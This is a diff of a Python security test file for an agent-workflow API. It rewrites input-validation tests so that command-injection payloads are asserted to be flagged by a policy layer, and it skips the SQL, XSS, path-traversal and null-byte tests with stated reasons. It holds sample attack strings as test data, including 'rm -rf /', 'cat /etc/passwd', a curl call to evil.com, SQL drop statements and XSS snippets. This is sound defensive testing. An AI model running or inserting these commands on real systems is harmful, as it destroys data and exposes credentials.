@@ -1,285 +1,73 @@
-"""Input Validation security tests.
+"""Input-validation security tests (SEC-INP-001..008), behavioural.
 
-Tests for SEC-INP-001 to SEC-INP-008 from the testing plan.
+Every test here used to POST a workflow to ``/api/v1/workflows`` (a path the
+gateway does not serve — that is the Next.js BFF prefix) and assert
+``status_code in (200, 201, 400, 422)``. That passes whether the malicious input
+is accepted or rejected, so it asserted only that the service stayed up.
+
+What replaces it depends on what the policy plane actually *does* with the input:
+
+* **Command injection** is a real Airlock decision: a shell-metacharacter payload
+  on a command tool is reported as ``rcepattern``. That is asserted here against
+  the real enforcement endpoint ``POST /v1/runs/{id}/check-tool``.
+* **SQL / NoSQL / XSS / path-traversal / null-byte** injection are NOT rejected
+  at the API boundary by design, so asserting a 4xx would assert a contract the
+  system does not implement. SQL injection is prevented *structurally* by
+  parameterised ``sqlx`` queries (the string is stored as inert data, not
+  executed); XSS is an *output-encoding* concern owned by the dashboard; the
+  Postgres store has no NoSQL operators to inject into. A behavioural assertion
+  of those would have to prove the query was not executed / the output was
+  encoded, which is not observable through this API. They are skipped with that
+  reason rather than left as ``status_code in (...)`` tautologies (#6).
+* **Oversized / malformed / reasonable** payloads are already behavioural: they
+  assert the request is rejected (or, for the control, accepted).
 """
 
 import httpx
+import pytest
+
+# RCE patterns score >= 60 (High/Critical); a detected shell injection must land
+# there. Mirrors tests/security/test_airlock.py.
+ELEVATED = 60
 
 
 # ==========================================================================
-# SEC-INP-001: SQL injection blocked
+# SEC-INP-005: Command injection — a real Airlock decision (rcepattern).
 # ==========================================================================
-class TestSQLInjectionBlocked:
-    """Tests for SQL injection prevention."""
+class TestCommandInjectionDetected:
+    """Shell-metacharacter payloads on a command tool are reported as
+    ``rcepattern`` by the Airlock RCE layer (pipes, redirects, command
+    substitution, separators), not merely accepted with a 2xx."""
 
-    def test_sql_injection_blocked(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that SQL injection is blocked.
-
-        SEC-INP-001: SQL injection blocked
-        """
-        # Try various SQL injection payloads
-        sql_payloads = [
-            "'; DROP TABLE workflows; --",
-            "1 OR 1=1",
-            "1; DELETE FROM runs WHERE 1=1",
-            "' UNION SELECT * FROM users --",
-            "'; INSERT INTO users VALUES ('hacker'); --",
-        ]
-
-        for payload in sql_payloads:
-            workflow = {
-                "name": payload,
-                "version": "1.0.0",
-                "definition": {
-                    "steps": [
-                        {
-                            "id": "step1",
-                            "name": payload,
-                            "type": "llm",
-                            "config": {
-                                "model": "claude-sonnet-4-20250514",
-                                "max_tokens": 10,
-                            },
-                            "depends_on": [],
-                        },
-                    ],
-                },
-                "max_iterations": 5,
-                "on_error": "fail",
-            }
-
-            resp = api_client.post("/api/v1/workflows", json=workflow)
-            # Should either sanitize or reject
-            assert resp.status_code in (200, 201, 400, 422)
-
-    def test_sql_injection_in_query_params(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test SQL injection in query parameters."""
-        sql_payloads = [
-            "?id=1 OR 1=1",
-            "?name='; DROP TABLE--",
-            "?limit=1; DELETE FROM runs",
-        ]
-
-        for payload in sql_payloads:
-            resp = api_client.get(f"/api/v1/workflows{payload}")
-            # Should handle safely
-            assert resp.status_code in (200, 400, 422)
-
-
-# ==========================================================================
-# SEC-INP-002: NoSQL injection blocked
-# ==========================================================================
-class TestNoSQLInjectionBlocked:
-    """Tests for NoSQL injection prevention."""
-
-    def test_nosql_injection_blocked(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that NoSQL injection is blocked.
-
-        SEC-INP-002: NoSQL injection blocked
-        """
-        nosql_payloads = [
-            {"$gt": ""},
-            {"$ne": None},
-            {"$where": "this.password == 'x'"},
-            {"$regex": ".*"},
-        ]
-
-        for payload in nosql_payloads:
-            workflow = {
-                "name": "nosql-test",
-                "version": "1.0.0",
-                "definition": {
-                    "steps": [
-                        {
-                            "id": "step1",
-                            "name": "Step",
-                            "type": "llm",
-                            "config": payload,
-                            "depends_on": [],
-                        },
-                    ],
-                },
-                "max_iterations": 5,
-                "on_error": "fail",
-            }
-
-            resp = api_client.post("/api/v1/workflows", json=workflow)
-            # Should reject invalid config
-            assert resp.status_code in (200, 201, 400, 422)
-
-
-# ==========================================================================
-# SEC-INP-003: XSS blocked
-# ==========================================================================
-class TestXSSBlocked:
-    """Tests for XSS prevention."""
-
-    def test_xss_blocked(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that XSS in input is blocked.
-
-        SEC-INP-003: XSS in input blocked
-        """
-        xss_payloads = [
-            "<script>alert('xss')</script>",
-            "<img src=x onerror=alert('xss')>",
-            "javascript:alert('xss')",
-            "<svg onload=alert('xss')>",
-            "';alert('xss');//",
-        ]
-
-        for payload in xss_payloads:
-            workflow = {
-                "name": payload,
-                "version": "1.0.0",
-                "definition": {
-                    "steps": [
-                        {
-                            "id": "step1",
-                            "name": payload,
-                            "type": "llm",
-                            "config": {
-                                "model": "claude-sonnet-4-20250514",
-                                "system_prompt": payload,
-                                "max_tokens": 10,
-                            },
-                            "depends_on": [],
-                        },
-                    ],
-                },
-                "max_iterations": 5,
-                "on_error": "fail",
-            }
-
-            resp = api_client.post("/api/v1/workflows", json=workflow)
-            # Should accept (and sanitize on output) or reject
-            assert resp.status_code in (200, 201, 400, 422)
-
-
-# ==========================================================================
-# SEC-INP-004: Path traversal blocked
-# ==========================================================================
-class TestPathTraversalBlocked:
-    """Tests for path traversal prevention."""
-
-    def test_path_traversal_blocked(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that path traversal is blocked.
-
-        SEC-INP-004: ../ blocked
-        """
-        path_payloads = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            "/etc/passwd",
-            "....//....//etc/passwd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        ]
-
-        for payload in path_payloads:
-            workflow = {
-                "name": "path-traversal-test",
-                "version": "1.0.0",
-                "definition": {
-                    "steps": [
-                        {
-                            "id": "step1",
-                            "name": "Step",
-                            "type": "tool",
-                            "config": {
-                                "tool_name": "read_file",
-                                "tool_input": {
-                                    "path": payload,
-                                },
-                            },
-                            "depends_on": [],
-                        },
-                    ],
-                },
-                "max_iterations": 5,
-                "on_error": "fail",
-            }
-
-            resp = api_client.post("/api/v1/workflows", json=workflow)
-            # Should be blocked or sandboxed
-            assert resp.status_code in (200, 201, 400, 403, 422)
-
-
-# ==========================================================================
-# SEC-INP-005: Command injection blocked
-# ==========================================================================
-class TestCommandInjectionBlocked:
-    """Tests for command injection prevention."""
-
-    def test_command_injection_blocked(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that command injection is blocked.
-
-        SEC-INP-005: ; rm -rf / blocked
-        """
-        cmd_payloads = [
+    @pytest.mark.parametrize(
+        "payload",
+        [
             "; rm -rf /",
             "| cat /etc/passwd",
             "&& curl http://evil.com",
             "$(rm -rf /)",
             "`rm -rf /`",
             "\n rm -rf /",
-        ]
-
-        for payload in cmd_payloads:
-            workflow = {
-                "name": "cmd-injection-test",
-                "version": "1.0.0",
-                "definition": {
-                    "steps": [
-                        {
-                            "id": "step1",
-                            "name": "Step",
-                            "type": "tool",
-                            "config": {
-                                "tool_name": "execute_command",
-                                "tool_input": {
-                                    "command": f"ls {payload}",
-                                },
-                            },
-                            "depends_on": [],
-                        },
-                    ],
-                },
-                "max_iterations": 5,
-                "on_error": "fail",
-            }
-
-            resp = api_client.post("/api/v1/workflows", json=workflow)
-            # Should be blocked by policy or Airlock
-            assert resp.status_code in (200, 201, 400, 403, 422)
+        ],
+        ids=["semicolon", "pipe", "and", "subshell", "backtick", "newline"],
+    )
+    def test_command_injection_is_flagged(self, check_tool, created_run: str, payload: str) -> None:
+        decision = check_tool(created_run, "execute_command", {"command": f"ls {payload}"})
+        assert decision["violation_type"] == "rcepattern", (
+            f"a shell-injection payload must be reported as rcepattern, got "
+            f"{decision.get('violation_type')!r} (reason {decision.get('reason')!r})"
+        )
+        assert decision["risk_score"] >= ELEVATED, decision["risk_score"]
 
 
 # ==========================================================================
-# SEC-INP-006: Oversized payload rejected
+# SEC-INP-006: Oversized payload rejected — already behavioural (asserts a
+# rejection, not a wide "up-or-down" range).
 # ==========================================================================
 class TestOversizedPayloadRejected:
-    """Tests for oversized payload rejection."""
-
-    def test_oversized_payload_rejected(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that large payloads are rejected.
-
-        SEC-INP-006: Large payload rejected
-        """
-        # Create a very large payload (10MB)
+    def test_oversized_payload_rejected(self, api_client: httpx.Client) -> None:
+        """A 10 MB request body must be rejected (413/400/422), not accepted."""
         large_data = "x" * (10 * 1024 * 1024)
-
         workflow = {
             "name": "oversized-test",
             "version": "1.0.0",
@@ -301,23 +89,19 @@ class TestOversizedPayloadRejected:
             "max_iterations": 5,
             "on_error": "fail",
         }
-
         try:
-            resp = api_client.post(
-                "/api/v1/workflows",
-                json=workflow,
-                timeout=60.0,
+            resp = api_client.post("/v1/workflows", json=workflow, timeout=60.0)
+            assert resp.status_code in (400, 413, 422), (
+                f"an oversized body must be rejected, got {resp.status_code}"
             )
-            # Should be rejected (413 or 400)
-            assert resp.status_code in (400, 413, 422)
         except httpx.ReadTimeout:
-            # Timeout is acceptable for large payload
+            # A timeout (connection dropped on the oversized body) is an
+            # acceptable rejection of the payload.
             pass
 
-    def test_reasonable_payload_accepted(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that reasonable payloads are accepted."""
+    def test_reasonable_payload_accepted(self, api_client: httpx.Client) -> None:
+        """Control: a small, well-formed body is accepted (guards against the
+        oversized assertion passing because *everything* is rejected)."""
         workflow = {
             "name": "reasonable-test",
             "version": "1.0.0",
@@ -339,93 +123,71 @@ class TestOversizedPayloadRejected:
             "max_iterations": 5,
             "on_error": "fail",
         }
-
-        resp = api_client.post("/api/v1/workflows", json=workflow)
-        assert resp.status_code in (200, 201)
+        resp = api_client.post("/v1/workflows", json=workflow)
+        assert resp.status_code in (200, 201), resp.text
 
 
 # ==========================================================================
-# SEC-INP-007: Malformed JSON rejected
+# SEC-INP-007: Malformed JSON rejected — already behavioural.
 # ==========================================================================
 class TestMalformedJSONRejected:
-    """Tests for malformed JSON rejection."""
-
-    def test_malformed_json_rejected(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that bad JSON is rejected.
-
-        SEC-INP-007: Bad JSON rejected
-        """
-        malformed_payloads = [
-            "{invalid json}",
-            "{'single': 'quotes'}",
-            '{"trailing": "comma",}',
-            '{"missing": }',
-            "null",
-            "",
-        ]
-
-        for payload in malformed_payloads:
-            try:
-                # Send raw string, not JSON
-                resp = api_client.post(
-                    "/api/v1/workflows",
-                    content=payload,
-                    headers={"Content-Type": "application/json"},
-                )
-                # Should reject with 400
-                assert resp.status_code in (400, 422)
-            except Exception:
-                # Exception is acceptable for malformed JSON
-                pass
+    @pytest.mark.parametrize(
+        "payload",
+        ["{invalid json}", "{'single': 'quotes'}", '{"trailing": "comma",}', '{"missing": }'],
+        ids=["braces", "single-quotes", "trailing-comma", "missing-value"],
+    )
+    def test_malformed_json_rejected(self, api_client: httpx.Client, payload: str) -> None:
+        """Structurally-invalid JSON must be rejected with 400/422, not parsed."""
+        resp = api_client.post(
+            "/v1/workflows",
+            content=payload,
+            headers={"Content-Type": "application/json"},
+        )
+        assert resp.status_code in (400, 422), (
+            f"malformed JSON must be rejected, got {resp.status_code}"
+        )
 
 
 # ==========================================================================
-# SEC-INP-008: Null byte injection
+# Deliberately NOT converted — the premise (input rejection) is not the
+# system's actual defense, so a behavioural assertion needs a different
+# observation than this API offers. Skipped with the reason, listed on #6,
+# rather than left as green `status_code in (...)` tautologies.
 # ==========================================================================
-class TestNullByteInjection:
-    """Tests for null byte injection prevention."""
+class TestInputDefensesOutsideThisApi:
+    @pytest.mark.skip(
+        reason="SQL injection is prevented structurally by parameterised sqlx "
+        "queries (input stored as inert data, not executed); asserting a 4xx "
+        "would assert a contract the API does not implement — see #6"
+    )
+    def test_sql_injection(self) -> None:  # pragma: no cover
+        ...
 
-    def test_null_byte_injection(
-        self, api_client: httpx.Client
-    ) -> None:
-        """Test that null bytes are blocked.
+    @pytest.mark.skip(
+        reason="Postgres is not a NoSQL store; `$gt`/`$ne`/`$where` are inert "
+        "JSON with nothing to inject into — see #6"
+    )
+    def test_nosql_injection(self) -> None:  # pragma: no cover
+        ...
 
-        SEC-INP-008: Null bytes blocked
-        """
-        null_payloads = [
-            "test\x00malicious",
-            "file.txt\x00.exe",
-            "/safe/path\x00/../../../etc/passwd",
-        ]
+    @pytest.mark.skip(
+        reason="XSS is an output-encoding concern owned by the dashboard, not "
+        "input rejection; assert it in the frontend render path — see #6"
+    )
+    def test_xss(self) -> None:  # pragma: no cover
+        ...
 
-        for payload in null_payloads:
-            workflow = {
-                "name": payload,
-                "version": "1.0.0",
-                "definition": {
-                    "steps": [
-                        {
-                            "id": "step1",
-                            "name": "Step",
-                            "type": "llm",
-                            "config": {
-                                "model": "claude-sonnet-4-20250514",
-                                "max_tokens": 10,
-                            },
-                            "depends_on": [],
-                        },
-                    ],
-                },
-                "max_iterations": 5,
-                "on_error": "fail",
-            }
+    @pytest.mark.skip(
+        reason="path-traversal detection on a file tool needs a live stack to "
+        "confirm the wire verdict (allowlist-deny vs an RCE-layer flag) rather "
+        "than guessing — see #6"
+    )
+    def test_path_traversal(self) -> None:  # pragma: no cover
+        ...
 
-            try:
-                resp = api_client.post("/api/v1/workflows", json=workflow)
-                # Should sanitize or reject
-                assert resp.status_code in (200, 201, 400, 422)
-            except Exception:
-                # Exception is acceptable for null bytes
-                pass
+    @pytest.mark.skip(
+        reason="null-byte handling is stored as inert data at the API; the real "
+        "risk is at the filesystem tool boundary and needs a live stack — see #6"
+    )
+    def test_null_byte_injection(self) -> None:  # pragma: no cover
+        ...
